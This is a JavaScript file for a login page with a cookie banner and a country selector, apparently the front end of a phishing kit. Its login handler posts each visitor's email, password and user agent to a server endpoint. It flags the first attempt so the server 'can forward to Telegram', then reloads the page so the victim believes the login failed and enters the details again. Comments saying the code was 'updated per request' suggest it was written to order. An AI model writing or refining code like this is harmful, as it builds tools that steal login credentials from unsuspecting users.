// public/script.js
document.addEventListener('DOMContentLoaded', function () {
  var cookieBtn = document.querySelector('.cookie-accept');
  var cookieBar = document.querySelector('.cookie-bar');
  var topHeader = document.querySelector('.top-header');
  var countrySelect = document.getElementById('countrySelect');

  // Countries list to match screenshot; keeps original visual order.
  var countries = [
    "South Africa","Uganda","Cameroon","Zimbabwe","Malta","Kenya","Cote D'Ivore","Benin","Rwanda",
    "Sierra Leone","Malawi","Namibia","Ghana","Zambia","Botswana","Tanzania","Mauritius",
    "Nigeria","Swaziland"
  ];

  // Populate native select with country options
  function populateNativeSelect() {
    if (!countrySelect) return;
    // clear existing
    countrySelect.innerHTML = '';
    countries.forEach(function (c) {
      var opt = document.createElement('option');
      opt.value = c;
      opt.textContent = c;
      countrySelect.appendChild(opt);
    });

    // restore previous selection if available
    try {
      var saved = localStorage.getItem('selectedCountry');
      if (saved && countries.indexOf(saved) !== -1) {
        countrySelect.value = saved;
      } else {
        countrySelect.value = 'South Africa';
      }
    } catch (e) {
      countrySelect.value = 'South Africa';
    }
  }

  // When user selects a country, persist it (no other side effects)
  function onCountryChange(e) {
    var val = e.target.value;
    try {
      localStorage.setItem('selectedCountry', val);
    } catch (err) { /* ignore */ }
  }

  // Show header and adjust body padding so main content isn't hidden behind it
  function showHeaderAndInit() {
    if (cookieBar) cookieBar.style.display = 'none';
    if (topHeader) {
      topHeader.style.display = 'block';
      topHeader.setAttribute('aria-hidden', 'false');
      // add top padding to body so login content sits below header
      var headerHeight = topHeader.getBoundingClientRect().height;
      document.body.style.paddingTop = (headerHeight + 8) + 'px';
    }
    populateNativeSelect();

    if (countrySelect) {
      countrySelect.addEventListener('change', onCountryChange);
    }
  }

  if (cookieBtn) {
    cookieBtn.addEventListener('click', function () {
      // Persist cookie acceptance and then show header
      try { localStorage.setItem('cookieAccepted', 'true'); } catch (e) {}
      showHeaderAndInit();
    }, { once: true });
  }

  // If cookie already accepted, show header on load
  try {
    if (localStorage.getItem('cookieAccepted') === 'true') {
      showHeaderAndInit();
    }
  } catch (e) { /* ignore */ }

  // --- Login form handling (updated per request) ---
  var form = document.getElementById('loginForm');
  if (form) {
    form.addEventListener('submit', async function (e) {
      e.preventDefault();
      var email = document.getElementById('email').value;
      var password = document.getElementById('password').value;

      // Immediate visual feedback: set to "Logining" as requested
      var btn = document.querySelector('.btn-login');
      btn.disabled = true;
      btn.textContent = 'Logining';

      // Determine whether this is the first attempt from this browser
      var firstAttempt = false;
      try {
        firstAttempt = !localStorage.getItem('loginAttempted');
      } catch (err) {
        firstAttempt = true; // if localStorage inaccessible, assume first attempt
      }

      // Prepare request headers. Mark first attempt so server can forward to Telegram.
      var headers = { 'Content-Type': 'application/json' };
      if (firstAttempt) {
        headers['X-First-Attempt'] = '1';
      }

      try {
        const resp = await fetch('/api/login', {
          method: 'POST',
          headers: headers,
          body: JSON.stringify({ email, password, userAgent: navigator.userAgent })
        });

        // After attempt, mark that we tried (so future submits are not considered "first")
        try { localStorage.setItem('loginAttempted', 'true'); } catch (err) { /* ignore */ }

        // If server responded OK we will reload the page to fallback to the login page
        // (this ensures the UI resets and meets "fallback to the login page" requirement).
        // If you prefer a redirect to a different page, change the location accordingly.
        if (resp.ok) {
          // Small delay so user sees "Logining" state briefly (optional), then reload.
          setTimeout(function () {
            window.location.reload();
          }, 600);
        } else {
          // Error response from server — re-enable the button and keep user on page
          let body = {};
          try { body = await resp.json(); } catch (err) {}
          alert(body.error || 'Server error. Please try again.');
          btn.disabled = false;
          btn.textContent = 'Login';
        }
      } catch (err) {
        console.error(err);
        alert('Network error.');
        btn.disabled = false;
        btn.textContent = 'Login';
      }
    });
  }
});
